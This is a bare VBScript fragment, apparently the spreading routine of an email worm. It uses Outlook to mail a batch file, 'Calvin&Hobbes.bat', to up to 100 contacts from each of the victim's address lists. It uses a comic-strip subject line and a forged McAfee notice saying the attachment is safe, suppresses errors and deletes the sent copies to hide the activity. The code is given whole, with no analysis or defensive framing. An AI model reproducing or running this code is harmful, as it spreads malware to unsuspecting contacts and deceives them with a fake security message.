on error resume next
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x = 101 Then oo = d.AddressEntries.Count
Next
c.Subject = "A Calvin And Hobbes Comic Strip"
c.Body = "-------------- McAfee Online Scanner ----------------" & vbcrlf & _
"The attached file doesn't contain any malicious routines" & vbcrlf & _
"-------------------------------------------------------------------" & vbcrlf & _
""
c.attachments.Add("c:\Calvin&Hobbes.bat")
c.Send
c.DeleteAfterSubmit = True
e = ""
Next
b.Logoff
End If
